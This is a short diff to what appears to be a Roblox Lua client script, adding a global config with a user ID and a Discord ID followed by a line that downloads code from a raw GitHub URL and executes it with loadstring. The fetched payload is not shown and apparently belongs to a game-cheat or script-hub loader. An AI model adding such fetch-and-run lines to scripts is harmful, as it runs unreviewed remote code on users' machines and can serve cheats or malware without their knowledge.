@@ -6,6 +6,8 @@ repeat task.wait() until Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local GuiService = game:GetService("GuiService")
 
+_G.Config = { UserID = "87b9b918-9238-4545-a2aa-5d2ac52691b1", discord_id = "354662781859004417" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/99night"))()
+
 local running = true
 
 task.spawn(function()
